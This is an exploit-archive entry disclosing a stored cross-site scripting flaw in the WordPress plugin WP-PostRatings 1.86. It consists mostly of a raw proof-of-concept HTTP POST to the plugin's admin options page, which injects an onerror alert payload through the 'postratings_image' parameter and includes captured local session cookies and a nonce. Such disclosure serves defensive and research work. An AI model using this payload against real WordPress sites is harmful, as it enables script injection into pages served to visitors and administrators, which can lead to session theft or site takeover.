@@ -1,0 +1,41 @@
+# Exploit Title: WordPress Plugin WP-PostRatings 1.86 - 'postratings_image' Cross-Site Scripting
+# Date: 20-12-2018
+# Software Link: https://wordpress.org/plugins/wp-postratings/
+# Exploit Author: Park Won Seok
+# Version: wp-postratings.1.86
+# Tested on: Windows 10 x64
+
+# description:
+# A Stored Cross-site scripting (XSS) was discovered in wordpress plugins wp-postratings.1.86
+# One parameters(postratings_image) have Cross-Site Scripting.
+
+# POC
+# XSS Stored
+
+POST
+http://localhost/wordpress/wp-admin/admin.php?page=wp-postratings/postratings-options.php
+ HTTP/1.1
+Host: localhost
+Content-Length: 1765
+Cache-Control: max-age=0
+Origin: localhost
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+(KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer:
+http://localhost/wordpress/wp-admin/admin.php?page=wp-postratings%2Fpostratings-options.php
+Accept-Encoding: gzip, deflate
+Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie:
+wordpress_14f4416c910366e4d17f08fa58e71587=wordpress%7C1545577867%7CZwsmD4U29rPGA853ANHO1NUarjSBZi6ul0sDVvkKLwr%7Cff47715fb398e65023b74d3aad0d0429061e90422614399cf1cffb88df424173;
+wp-settings-1=deleted; wp-settings-time-1=1545201993;
+wordpress_test_cookie=WP+Cookie+check;
+wordpress_logged_in_14f4416c910366e4d17f08fa58e71587=wordpress%7C1545577867%7CZwsmD4U29rPGA853ANHO1NUarjSBZi6ul0sDVvkKLwr%7Cd63f851c891cd0792c2c7e5a2d62342ffb57501777f1e8f0e9c13b8ff0daacc2
+Connection: close
+
+_wpnonce=b841885588&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fadmin.php%3Fpage%3Dwp-postratings%2Fpostratings-options.php&postratings_customrating=0&postratings_template_vote=%25RATINGS_IMAGES_VOTE%25+%28%3Cstrong%3E%25RATINGS_USERS%25%3C%2Fstrong%3E+votes%2C+average%3A+%3Cstrong%3E%25RATINGS_AVERAGE%25%3C%2Fstrong%3E+out+of+%25RATINGS_MAX%25%29%3Cbr+%2F%3E%25RATINGS_TEXT%25&postratings_template_text=%25RATINGS_IMAGES%25+%28%3Cem%3E%3Cstrong%3E%25RATINGS_USERS%25%3C%2Fstrong%3E+votes%2C+average%3A+%3Cstrong%3E%25RATINGS_AVERAGE%25%3C%2Fstrong%3E+out+of+%25RATINGS_MAX%25%2C+%3Cstrong%3Erated%3C%2Fstrong%3E%3C%2Fem%3E%29&postratings_template_permission=%25RATINGS_IMAGES%25+%28%3Cem%3E%3Cstrong%3E%25RATINGS_USERS%25%3C%2Fstrong%3E+votes%2C+average%3A+%3Cstrong%3E%25RATINGS_AVERAGE%25%3C%2Fstrong%3E+out+of+%25RATINGS_MAX%25%3C%2Fem%3E%29%3Cbr+%2F%3E%3Cem%3EYou+need+to+be+a+registered+member+to+rate+this.%3C%2Fem%3E&postratings_template_none=%25RATINGS_IMAGES_VOTE%25+%28No+Ratings+Yet%29%3Cbr+%2F%3E%25RATINGS_TEXT%25&postratings_template_highestrated=%3Cli%3E%3Ca+href%3D%22%25POST_URL%25%22+title%3D%22%25POST_TITLE%25%22%3E%25POST_TITLE%25%3C%2Fa%3E+%25RATINGS_IMAGES%25+%28%25RATINGS_AVERAGE%25+out+of+%25RATINGS_MAX%25%29%3C%2Fli%3E&postratings_template_mostrated=%3Cli%3E%3Ca+href%3D%22%25POST_URL%25%22++title%3D%22%25POST_TITLE%25%22%3E%25POST_TITLE%25%3C%2Fa%3E+-+%25RATINGS_USERS%25+votes%3C%2Fli%3E&
+[postratings_image=stars\"onerror=alert(1)
+--]&postratings_max=2&postratings_richsnippet=0&postratings_ratingstext%5B%5D=1+Star&postratings_ratingsvalue%5B%5D=%2B1&postratings_ratingstext%5B%5D=&postratings_ratingsvalue%5B%5D=0&postratings_ajax_style_loading=1&postratings_ajax_style_fading=1&postratings_allowtorate=2&postratings_logging_method=3&Submit=Save+Changes
